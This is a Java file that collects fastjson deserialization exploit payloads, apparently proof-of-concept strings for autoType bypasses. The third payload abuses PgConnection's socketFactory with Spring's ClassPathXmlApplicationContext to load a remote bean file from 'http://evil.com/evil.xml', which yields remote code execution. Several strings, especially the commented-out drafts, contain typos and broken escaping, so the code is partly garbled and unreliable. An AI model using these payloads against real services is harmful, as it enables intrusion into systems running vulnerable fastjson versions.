public class TestMiscCode {
//    private static String poc1 = "{\n" +
//            "    \"@type\":\"java.lang.Exception\",\n" +
//            "    \"@type\":\"org.python.antlr.ParseException\"}";
//
//    private static String poc2 = "{\n" +
//            "    \"@type\":\"java.util.Locale\",\n" + "\t\t " +"
//            \"val\":{\"@type\":\"alibalibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"org.python.antlr.ParseException\",\"type\"" +
//            ":{\"@type\\\":\\\"com.python.sql.PyConnection\\\",\\\"connection\\\":{@type:org.postgresql.jdbc.PgConnection}} } }";
//
//    private static String poc3 = "{\n" +
//            "    \"@type\":\"org.postgresql.jdbc.PgConnection\",\n" +
//            "    \"hostSpecs\":\"host:  port:\" user:} " +
//            "databae:" +
//            "socketFactory : org.springframework.context.support.ClassPathXmlApplication  " +
//            " sockerFactoryArg ";

    public static void main(String[] args) {
        String poc1 =" { \n" +
                "\t\"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.python.antlr.ParseException\"\n" +
                "}";
    }
    String poc2 = " { \n" +
            "\t\"@type\":\"java.util.Locale\",\n" +
            "    \"val\":\n" +
            "\t{\"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
            "\t {\"@type\":\"java.lang.Sting\"\"@type\":\"org.python.antlr.ParseException\",\"type\":\"{\\\"@type\\\":\\\"com.ziclix.python.sql.PyConnection\\\",\\\"connection\\\":{\\\"@type\\\\\\\":\\\"org.postgresql.jdbc.PgConnection\"}}\"}\n" +
            "\t }\n" +
            "}";
    String poc3 = "{\n" +
            "\t\"@type\":\"org.postgresql.jdbc.PgConnection\",\n" +
            "\t\"hostSpecs\":[{\"host\":\"jdbc_ip\",\"port\":jdbc_port}],\n" +
            "\t\"user\":\"user\",\n" +
            "\t\"database\":\"testdb\",\n" +
            "\t\"info\":{\"socketFactory\":\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"socketFactoryArg\":\"http://evil.com/evil.xml\"},\n" +
            "\t\"url\":\"\"\n" +
            "}";
}
